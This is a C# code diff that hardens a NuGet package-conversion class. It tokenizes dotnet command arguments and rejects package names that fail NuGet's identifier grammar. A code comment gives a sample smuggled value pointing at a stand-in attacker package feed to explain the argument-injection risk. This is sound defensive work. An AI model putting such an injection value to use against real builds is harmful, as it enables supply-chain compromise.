@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.Diagnostics.Contracts;
 using System.IO;
 using System.Linq;
+using System.Text.RegularExpressions;
 using System.Xml.Linq;
 using Clio.Project.NuGet;
 using Clio.Workspaces;
@@ -40,6 +41,13 @@ public class NugetMaterializer : INugetMaterializer
 
 	//The build output the helper project leaves behind, dropped before every conversion.
 	private static readonly string[] StaleHelperOutputFolders = ["bin", "obj"];
+
+	//NuGet's package-identifier grammar: dot-separated segments of letters, digits, underscores and hyphens.
+	private static readonly Regex NugetPackageIdentifierPattern =
+		new(@"^\w+([_.-]\w+)*$", RegexOptions.Compiled | RegexOptions.CultureInvariant);
+
+	//NuGet's own ceiling for a package identifier.
+	private const int MaximumNugetPackageIdentifierLength = 100;
 
 	//Everything that could make a package name address a folder other than its own.
 	private static readonly char[] PathSeparatorChars =
@@ -79,7 +87,13 @@ public class NugetMaterializer : INugetMaterializer
 	private bool AddNugetReferences(string packageName, IEnumerable<XElement> xElements){
 		IEnumerable<NugetPackage> refs = GetNugetReferences(xElements);
 		foreach (NugetPackage nugetPackage in refs) {
-			if (RunInNugetProject(packageName, $"add package {nugetPackage.Name} -v {nugetPackage.Version}")) {
+			if (!IsNugetPackageIdentifier(nugetPackage.Name)) {
+				_logger.WriteError($"The '{nugetPackage.Name}' PackageReference Include is not a NuGet package "
+					+ $"identifier. No package reference was converted in the {packageName} package");
+				return false;
+			}
+			if (RunInNugetProject(packageName, "add", "package", nugetPackage.Name, "-v",
+				nugetPackage.Version.ToString())) {
 				continue;
 			}
 			//Carrying on would build props out of the packages that did resolve, and the command
@@ -103,7 +117,8 @@ public class NugetMaterializer : INugetMaterializer
 	/// <param name="packageName">Name of the package to build</param>
 	/// <returns>True when <c>dotnet build</c> exited successfully.</returns>
 	private bool BuildNugetProject(string packageName){
-		if (RunInNugetProject(packageName, $"build {packageName}.csproj -c Release --no-incremental")) {
+		if (RunInNugetProject(packageName, "build", $"{packageName}.csproj", "-c", "Release",
+			"--no-incremental")) {
 			return true;
 		}
 		//A failed build leaves whatever bin content the previous run produced, and reading that back
@@ -121,8 +136,13 @@ public class NugetMaterializer : INugetMaterializer
 	/// <c>dotnet add</c> or <c>dotnet build</c> was indistinguishable from a successful one and the
 	/// command went on to publish props built from stale output.
 	/// </remarks>
-	private bool RunInNugetProject(string packageName, string arguments){
-		ProcessExecutionOptions options = new("dotnet", arguments) {
+	private bool RunInNugetProject(string packageName, params string[] arguments){
+		// Tokens, not one interpolated string: the package identifier and version come from the converted
+		// project, and dotnet splits its own command line, so "Foo --source https://attacker.example/v3/index.json"
+		// in a PackageReference Include would arrive as extra options and let a later restore pull and run
+		// attacker-controlled build/buildTransitive targets. UseShellExecute = false does not prevent that.
+		ProcessExecutionOptions options = new("dotnet", string.Empty) {
+			ArgumentList = arguments,
 			WorkingDirectory = BuildNugetProjectFolderPath(packageName)
 		};
 		ProcessExecutionResult result = _processExecutor.ExecuteAndCaptureAsync(options)
@@ -130,7 +150,7 @@ public class NugetMaterializer : INugetMaterializer
 		if (result is {Started: true, ExitCode: 0}) {
 			return true;
 		}
-		_logger.WriteError($"dotnet {arguments} failed with exit code "
+		_logger.WriteError($"dotnet {string.Join(' ', arguments)} failed with exit code "
 			+ $"{result?.ExitCode?.ToString() ?? "<none>"}");
 		string output = JoinNonEmptyOutput(result?.StandardOutput, result?.StandardError);
 		if (!string.IsNullOrWhiteSpace(output)) {
@@ -211,6 +231,21 @@ public class NugetMaterializer : INugetMaterializer
 		}
 		return true;
 	}
+
+	/// <summary>
+	/// Rejects a <c>PackageReference Include</c> value that is not a NuGet package identifier.
+	/// </summary>
+	/// <remarks>
+	/// The value is written by whoever wrote the converted project, and it is handed to <c>dotnet add</c> and
+	/// then to a restore. NuGet's own grammar for an identifier is dot-separated segments of letters, digits,
+	/// underscores and hyphens, so anything carrying whitespace, a leading dash, or a path separator is not a
+	/// package name and is refused before the process starts - tokenized arguments stop it from being read as
+	/// an option, and this stops it from being sent at all.
+	/// </remarks>
+	private static bool IsNugetPackageIdentifier(string packageIdentifier) =>
+		!string.IsNullOrWhiteSpace(packageIdentifier)
+		&& packageIdentifier.Length <= MaximumNugetPackageIdentifierLength
+		&& NugetPackageIdentifierPattern.IsMatch(packageIdentifier);
 
 	[Pure]
 	private IEnumerable<XElement> FindNugetReferences(string xmlContent){
